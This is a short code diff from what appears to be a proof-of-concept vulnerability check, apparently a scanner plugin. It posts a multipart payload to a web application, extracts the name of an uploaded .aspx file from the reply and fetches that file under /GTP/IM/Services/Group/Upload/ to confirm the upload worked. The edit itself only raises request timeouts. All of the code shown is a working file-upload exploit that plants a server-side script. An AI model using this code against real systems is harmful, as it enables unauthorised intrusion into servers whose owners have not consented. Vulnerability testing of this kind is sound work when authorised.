@@ -69,13 +69,13 @@ Content-Type: application/text
 ------123'''
         try:
             
-            resq  = requests.post(url=self.url+path,headers=headers,data=payload,timeout=5,verify=False,allow_redirects=False)
+            resq  = requests.post(url=self.url+path,headers=headers,data=payload,timeout=10,verify=False,allow_redirects=False)
             if resq.status_code == 200 and 'success:true' in resq.text:
                 #print(resq.text)
                 shell_name = re.search("(?<=result:')(.*)(.aspx)",resq.text).group()
                 #print(shell_name)
                 shell_path = '/GTP/IM/Services/Group/Upload/'+ shell_name
-                resq_2  = requests.get(url=self.url+shell_path,headers=headers,timeout=5,verify=False)
+                resq_2  = requests.get(url=self.url+shell_path,headers=headers,timeout=10,verify=False)
                 if encrypted_string in resq_2.text:
                     result['VerifyInfo'] = {}
                     result['VerifyInfo']['URL'] = self.url + path
